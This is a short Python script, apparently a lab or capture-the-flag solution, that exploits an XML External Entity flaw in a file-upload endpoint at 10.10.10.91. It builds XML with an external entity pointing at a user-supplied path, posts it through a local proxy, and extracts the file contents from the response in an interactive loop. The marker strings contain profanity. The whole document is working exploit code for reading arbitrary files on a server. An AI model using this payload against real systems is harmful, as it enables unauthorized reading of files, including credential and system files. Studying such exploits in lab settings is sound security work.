#!/usr/bin/env python
# coding=utf-8
import requests
import re

def PerformXXE(filename):
    xml = f"""<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY MyFile SYSTEM "{filename}">
]>

<LETMEIN>
 <Author>Jason1</Author>
 <Subject>FUCK 
&MyFile;
FUCK</Subject>
 <Content>Jason3</Content>
</LETMEIN>"""
    files = { "file" : ('Fuck.xml', xml)}
    response=requests.post('http://10.10.10.91:5000/upload', \
                           proxies={'http':'http://127.0.0.1:8080'}, \
                            files=files).text
    result = re.findall(r'FUCK\s(.*)\s\sFUCK', response, re.DOTALL)[0]
    return result

while True:
    fname = input('>')
    print(PerformXXE(fname))
    
